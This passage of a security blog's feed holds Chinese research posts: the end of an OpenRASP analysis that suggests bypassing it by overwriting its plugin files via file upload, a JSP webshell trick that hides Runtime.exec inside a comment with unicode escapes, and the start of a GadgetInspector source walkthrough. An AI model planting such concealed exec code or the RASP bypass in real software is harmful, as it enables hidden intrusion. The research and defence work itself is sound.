src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/32.png"></p><h3 id="覆盖插件"><a href="#覆盖插件" class="headerlink" title="覆盖插件"></a>覆盖插件</h3><p>我们知道OpenRASP通过<code>InitFileWatcher</code>,一旦其中的js文件被<code>创建</code>、<code>改变</code>、<code>删除</code>都会触发插件的</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/33.png"></p><p>并且我们可以看到插件配置当中对于文件上传<code>js</code>默认是关闭逻辑检测的开关</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/34.png"></p><p>因此我们如果存在任意文件上传并且可以跨目录再并且知道插件路径的情况下，虽然不是很通用但好歹也是一个手段</p><p>至于有没有其他方式这里暂时我就不探究了，顺便吐槽学校的实训太累了，心理上的累</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://rasp.baidu.com/doc/">官方文档</a></p><p><a href="https://blog.csdn.net/qq_26822029/article/details/81022227">C++中构造函数的两种写法</a></p><p><a href="https://www.freesion.com/article/94341002625/">JNIENV介绍</a></p><p><a href="https://xz.aliyun.com/t/8148">以OpenRASP为基础-展开来港港RASP的类加载</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Rasp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PbootCMS&lt;=3.1.2前台注入分析</title>
      <link href="/2022/05/23/year/2022/5/PbootCMS-3-1-2%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/23/year/2022/5/PbootCMS-3-1-2%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="401b7179064b00fe4a396d69971acd098228a6ce793dd66e78631d88eb952766"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JspWebShell新姿势解读</title>
      <link href="/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/"/>
      <url>/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JspWebShell新姿势解读"><a href="#JspWebShell新姿势解读" class="headerlink" title="JspWebShell新姿势解读"></a>JspWebShell新姿势解读</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    刚刚无意间发现我yzddmr6发了篇新文章，里面提到了一个jspwebshell的新姿势，但是没有具体分析，那么这里我就接着来分析一波</p><p>首先代码长这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Runtime.getRuntime().</span><br><span class="line">    <span class="comment">//\u000d\uabcdexec(&quot;open -na Calculator&quot;);</span></span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>如果按照传统Java的javac的方式编译这样一定是会出错的，这里不贴图自己试试，而jsp不同于普通的java程序，jsp是有自己的对类编译时的实现机制,其编译类的时候最终是在<code>org.apache.jasper.compiler.JDTCompiler#generateClass</code>生成我们的class文件(省略中途的很多步骤直捣黄龙，不然讲着也费劲)</p><p>这是调用栈，有兴趣可以深入分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">getNextToken0:<span class="number">1482</span>, Scanner (org.eclipse.jdt.internal.compiler.parser)</span><br><span class="line">getNextToken:<span class="number">1462</span>, Scanner (org.eclipse.jdt.internal.compiler.parser)</span><br><span class="line">fetchNextToken:<span class="number">12999</span>, Parser (org.eclipse.jdt.internal.compiler.parser)</span><br><span class="line">parse:<span class="number">12891</span>, Parser (org.eclipse.jdt.internal.compiler.parser)</span><br><span class="line">parse:<span class="number">13277</span>, Parser (org.eclipse.jdt.internal.compiler.parser)</span><br><span class="line">parseStatements:<span class="number">225</span>, MethodDeclaration (org.eclipse.jdt.internal.compiler.ast)</span><br><span class="line">parseMethods:<span class="number">1152</span>, TypeDeclaration (org.eclipse.jdt.internal.compiler.ast)</span><br><span class="line">getMethodBodies:<span class="number">11941</span>, Parser (org.eclipse.jdt.internal.compiler.parser)</span><br><span class="line">process:<span class="number">888</span>, Compiler (org.eclipse.jdt.internal.compiler)</span><br><span class="line">processCompiledUnits:<span class="number">575</span>, Compiler (org.eclipse.jdt.internal.compiler)</span><br><span class="line">compile:<span class="number">475</span>, Compiler (org.eclipse.jdt.internal.compiler)</span><br><span class="line">compile:<span class="number">426</span>, Compiler (org.eclipse.jdt.internal.compiler)</span><br><span class="line">generateClass:<span class="number">457</span>, JDTCompiler (org.apache.jasper.compiler)</span><br><span class="line">compile:<span class="number">397</span>, Compiler (org.apache.jasper.compiler)</span><br><span class="line">compile:<span class="number">367</span>, Compiler (org.apache.jasper.compiler)</span><br><span class="line">compile:<span class="number">351</span>, Compiler (org.apache.jasper.compiler)</span><br><span class="line">compile:<span class="number">605</span>, JspCompilationContext (org.apache.jasper)</span><br><span class="line">service:<span class="number">399</span>, JspServletWrapper (org.apache.jasper.servlet)</span><br><span class="line">serviceJspFile:<span class="number">379</span>, JspServlet (org.apache.jasper.servlet)</span><br><span class="line">service:<span class="number">327</span>, JspServlet (org.apache.jasper.servlet)</span><br><span class="line">service:<span class="number">763</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1732</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">844</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>好了不扯那么多，回到正题，在讲之前我们需要知道有个东西叫javadoc相信大家都很熟悉了就是用于描述方法或者类的作用的东西，而造成可以解析的原因其实和这个有关系(jsp编译过程当中用到了AST，这里不多扯)</p><p>在生成最终class的过程当中，它会遍历文件当中的字符并做unicode解码处理，下图可以看到正在遍历的过程</p><p><img src="/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/0.png"></p><p>而对于unicode的处理最终在<code>org.eclipse.jdt.internal.compiler.parser.Scanner#getNextToken0</code>，简单看了眼代码其实是为了让AST兼容注释功能，回到代码如果开头是<code>/</code>，之后会判断下一个字符是<code>/</code>还是<code>*</code>,也就是单行或者多行注释咯</p><p><img src="/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/1.png"></p><p>根据代码我们这里显然<code>lookAhead</code>为0，因此我们来看if分支，继续往下走当前为<code>\r</code>如果下一个又是unicode编码的字符会进行unicode解码同时isJavadoc属性会赋值true</p><p><img src="/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/2.png"></p><p>接着往下我们的<code>\uabcd</code>是乱码字符和下面条件也不符合所以也不继续走了简单看看代码呗，不走的原因一方面是这个下一个字符不是<code>\n</code>另一方面checkNonExternalizedStringLiterals在我这个tomcat版本默认为false</p><p><img src="/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/4.png"></p><p>但是我还是好奇的看了一眼parseTags函数，在里面处理的注释前缀是<code>TAG_PREFIX = &quot;//$NON-NLS-&quot;.toCharArray();</code>，以及<code>IDENTITY_COMPARISON_TAG = &quot;//$IDENTITY-COMPARISON$&quot;</code>很神奇简单考古可以看到<a href="https://stackoverflow.com/questions/654037/what-does-non-nls-1-mean%EF%BC%8C%E4%BB%8E%E6%8F%8F%E8%BF%B0%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%87%BA%E4%BD%9C%E7%94%A8%E6%98%AF%E4%B8%BA%E4%BA%86%E5%9B%BD%E9%99%85%E5%8C%96%EF%BC%8C%E4%BD%86%E6%9B%B4%E5%85%B7%E4%BD%93%E7%9A%84%E5%8F%AF%E4%BB%A5%E7%9C%8B%E7%9C%8B%E5%AE%98%E6%96%B9%E7%9A%84%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%BA%86%E8%A7%A3%E5%86%99%E7%9A%84%E5%BE%88%E8%AF%A6%E7%BB%86https://www.eclipse.org/articles/Article-Internationalization/how2I18n.html">https://stackoverflow.com/questions/654037/what-does-non-nls-1-mean，从描述可以看出作用是为了国际化，但更具体的可以看看官方的这篇文章了解写的很详细https://www.eclipse.org/articles/Article-Internationalization/how2I18n.html</a></p><p><img src="/2022/05/16/year/2022/5/JspWebShell%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E8%AF%BB/3.png"></p><p>当然肯定能在这个层面上做更多的混淆，接下来的灵活的工作就交给大家自己构造了，感谢我yzddmr6，之前还没想到可以这样</p><p>但是还是不知道如果默认属性开的情况下，为什么出现<code>//\u000d\u000a</code>或<code>//\u000d\u000d</code>就会判别是要去识别那两个标签，希望有懂的师傅说说</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Webshell </tag>
            
            <tag> Jsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GadgetInspector源码分析</title>
      <link href="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="GadgetInspector源码分析"><a href="#GadgetInspector源码分析" class="headerlink" title="GadgetInspector源码分析"></a>GadgetInspector源码分析</h1><h2 id="前置废话"><a href="#前置废话" class="headerlink" title="前置废话"></a>前置废话</h2><p>我不想搞介绍，就这样吧，写这个主要是网上的对我很晦涩，很多别人觉得简单的我不会，包括一些汇编指令等，当然本篇也是站在很多前辈的肩膀上进行学习，属实是少花了很多功夫</p><p>在分析gadgetinspector源码的时候，大概会对各个核心类讲解，并简单分析ASM部分，btw本篇基于jdk8进行分析</p><p>当然既然是学习，那么我们肯定是需要跟踪代码的，而GI这款工具属实头疼，本身不仅引入了jdk的一些依赖如rt.jar，在调试的过程当中也出现了gadgetinspector当中的类，属实不适合学习时使用，为了解决这个问题，我在<code>gadgetinspector.ClassResourceEnumerator#getAllClasses</code>当中将源码修改如此，这样我便能自行写代码逻辑，并展开学习，我个人认为化繁为简也是一个很重要的过程，如下我剔除了jdk原本的类，并且要求全类名包含特定字符，因此解决了这个问题，当然在具体使用的时候还是要替换回来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Collection&lt;ClassResource&gt; <span class="title">getAllClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">//        Collection&lt;ClassResource&gt; result = new ArrayList&lt;&gt;(getRuntimeClasses());</span></span><br><span class="line">  Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">  <span class="keyword">if</span> (ConfigHelper.onlyJDK)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (classInfo.getName().contains(<span class="string">&quot;yyds&quot;</span>))&#123;</span><br><span class="line">      result.add(<span class="keyword">new</span> ClassLoaderClassResource(classLoader, classInfo.getResourceName()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到经过简单的优化，过程也更加清晰，但是在后面有些地方需要改回来不然得不到正确结果，这里是为了分析所以暂时改一下</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/0.png"></p><p>在学习的时候配合反汇编代码会更容易理解，Java也自带了查看的方法<code>javap -c 类名</code></p><p>lol，多逼逼一句一定要在熟悉jvm stack和本地变量表，不然很多逻辑会是懵的</p><h2 id="ASM部分"><a href="#ASM部分" class="headerlink" title="ASM部分"></a>ASM部分</h2><p>这部分不建议直接看，建议在后面看到具体部分再来看看</p><h3 id="模拟JVM栈帧变化"><a href="#模拟JVM栈帧变化" class="headerlink" title="模拟JVM栈帧变化"></a>模拟JVM栈帧变化</h3><p>这部分很重要如果搞不明白后面在看GI代码的时候会很懵逼</p><p>在程序运行的过程中，每一个线程都对应一个属于自己的JVM Stack。当一个新线程开始时会在内存上分配一个属于自己的JVM Stack；当该线程执行结束后，相应的JVM Stack内存空间也就被回收了。</p><p>在JVM Stack当中，是栈的结构，里面存储的是frames；每一个frame空间可以称之为Stack Frame。当调用一个新方法的时候，就会在JVM Stack上分配一个frame空间；当方法退出时，相应的frame空间也会JVM Stack上进行清除掉（出栈操作）。在frame空间当中，有两个重要的结构，即local variables（一个索引从0开始的数组）和operand stack（栈的结构）。对于每一个方法来说，它都是在自己的Stack Frame上来运行的，在编译的时候，就决定了local variables和operand stack的大小。</p><p>这里特别要注意在方法刚开始的时候，operand stack是空，不需要存储任何的数据，而local variables的初始状态，则需要考虑三个因素：</p><ul><li>当前方法是否为static方法。如果当前方法是non-static方法，则需要在local variables索引为0的位置存在一个this变量；如果当前方法是static方法，则不需要存储this。</li><li>当前方法是否接收参数。方法接收的参数，会按照参数的声明顺序放到local variables当中。</li><li>方法参数是否包含long或double类型。如果方法的参数是long或double类型，那么它在local variables当中占用两个位置。</li></ul><p>这里推荐一个IDEA的插件<code>ASM Bytecode Viewer</code>，可以很方便配合学习理解，同时如果需要查当中的汇编指令的含义也很简单，去官网看看就好<a href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-6.html">https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-6.html</a></p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png"></p><h3 id="ClassVisitor"><a href="#ClassVisitor" class="headerlink" title="ClassVisitor"></a>ClassVisitor</h3><p>我们只要知道在ClassVisitor类当中，定义的visitXxx()方法中的参数与ClassFile结构密切相关就很关键了</p><p>首先看看里面的字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">  <span class="comment">//指出了当前使用的ASM API版本</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">int</span> api;</span><br><span class="line">  <span class="comment">//一个ClassVisitor类型的数据，可以将多个ClassVisitor串连起来</span></span><br><span class="line">    <span class="keyword">protected</span> ClassVisitor cv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClassVisitor当中许多的visitXxx()方法，这些visitXxx()方法与<code>ClassFile</code>的结构密切相关，而这下面四个才是我们关注的主体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> <span class="keyword">int</span> version,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> <span class="keyword">int</span> access,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String name,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String signature,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String superName,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String[] interfaces)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">( // 访问字段</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> <span class="keyword">int</span> access,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String name,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String descriptor,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String signature,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> Object value)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">( // 访问方法</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> <span class="keyword">int</span> access,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String name,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String descriptor,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String signature,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">final</span> String[] exceptions)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中signature为类签名（非泛型为NUll），同时visitXxx()方法，也有调用顺序，了解下就好，结合这个调用顺序，GI的这部分代码就很好懂了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">visit</span><br><span class="line">[visitSource][visitModule][visitNestHost][visitPermittedSubclass][visitOuterClass]</span><br><span class="line">(</span><br><span class="line"> visitAnnotation |</span><br><span class="line"> visitTypeAnnotation |</span><br><span class="line"> visitAttribute</span><br><span class="line">)*</span><br><span class="line">(</span><br><span class="line"> visitNestMember |</span><br><span class="line"> visitInnerClass |</span><br><span class="line"> visitRecordComponent |</span><br><span class="line"> visitField |</span><br><span class="line"> visitMethod</span><br><span class="line">)* </span><br><span class="line">visitEnd</span><br></pre></td></tr></table></figure><h3 id="MethodVisitor"><a href="#MethodVisitor" class="headerlink" title="MethodVisitor"></a>MethodVisitor</h3><p>和上面很多部分相似，我们直接入正文，也是有很多关键的visitxxx方法，对一些我们需要的做个精简的调用，看英文名称就能知道意思就不多说每个部分了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(visitParameter)*</span><br><span class="line">[visitAnnotationDefault]</span><br><span class="line">(visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation | visitTypeAnnotation | visitAttribute)*</span><br><span class="line">[</span><br><span class="line">    visitCode</span><br><span class="line">    (</span><br><span class="line">        visitFrame<span class="comment">//访问当前局部变量表和操作数栈中元素的状态，参数就是局部变量表和操作数栈的内容 |</span></span><br><span class="line">        visitXxxInsn |</span><br><span class="line">        visitLabel |</span><br><span class="line">        visitInsnAnnotation |</span><br><span class="line">        visitTryCatchBlock |</span><br><span class="line">        visitTryCatchAnnotation |</span><br><span class="line">        visitLocalVariable |</span><br><span class="line">        visitLocalVariableAnnotation |</span><br><span class="line">        visitLineNumber</span><br><span class="line">    )*</span><br><span class="line">    visitMaxs</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里主要记录下visitxxxInsn</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">visitFieldInsn ： 访问某个成员变量的指令，支持GETSTATIC, PUTSTATIC, GETFIELD or PUTFIELD.</span><br><span class="line">visitIincInsn ： 访问自增指令</span><br><span class="line">visitVarInsn ：访问局部变量指令，就是取局部变量变的值放入操作数栈</span><br><span class="line">visitMethodInsn ：访问方法指令，就是调用某个方法，支持INVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC or INVOKEINTERFACE.</span><br><span class="line">visitInsn ： 访问无操作数的指令，例如nop，duo等等</span><br><span class="line">visitTypeInsn：访问type指令，即将一个类的全限定名作为参数然后<span class="keyword">new</span>一个对象压入操作数栈中</span><br></pre></td></tr></table></figure><p>在GI当中我们主要关心visitMethodInsn，顺便说一些相关指令其中invokestatic用来调用静态方法；invokespecial用来调用私有方法，父类方法(super.)，类构造器方法；invokeinterface调用接口方法；invokedynamic方法动态执行；invokevirtual调用所有虚方法，即除了以上的方法外全用invokevirtual调用。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>下面根据流程分析具体的类当中的操作</p><h3 id="MethodDiscovery"><a href="#MethodDiscovery" class="headerlink" title="MethodDiscovery"></a>MethodDiscovery</h3><p>这个方法主要是获得类以及方法的信息</p><p>其中在methods.dat里面按照指定格式记录：类名、方法名、参数以及返回值、是否为静态方法</p><p>在classes.dat里面按照指定格式记录：类名、父类名、实现的接口名、是否为接口、类的所有字段、注解名</p><p>看了下main函数的主体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader classLoader = Util.getWarClassLoader(Paths.get(<span class="string">&quot;/Users/y4tacker/Desktop/test/shorter-0.0.1-SNAPSHOT.jar&quot;</span>));</span><br><span class="line">MethodDiscovery methodDiscovery = <span class="keyword">new</span> MethodDiscovery();</span><br><span class="line">methodDiscovery.discover(<span class="keyword">new</span> ClassResourceEnumerator(classLoader));</span><br><span class="line">methodDiscovery.save();</span><br></pre></td></tr></table></figure><p>首先第一行的<code>gadgetinspector.Util#getWarClassLoader</code>不是很难不贴代码了，首先创建了一个临时文件夹，通过addShutdownHook在jvm shutdown自动删除，之后将jar/war的文件解压到临时文件夹，并配置/资源文件的路径，并返回URLClassLoader</p><p>之后调用<code>gadgetinspector.MethodDiscovery#discover</code>，可以看出通过foreach遍历，之后使用asm的ClassVisitor、MethodVisitor，利用观察模式去扫描所有的class和method并记录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">    <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123;</span><br><span class="line">      ClassReader cr = <span class="keyword">new</span> ClassReader(in);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//使用asm的ClassVisitor、MethodVisitor，利用观察模式去扫描所有的class和method并记录</span></span><br><span class="line">        cr.accept(<span class="keyword">new</span> MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) 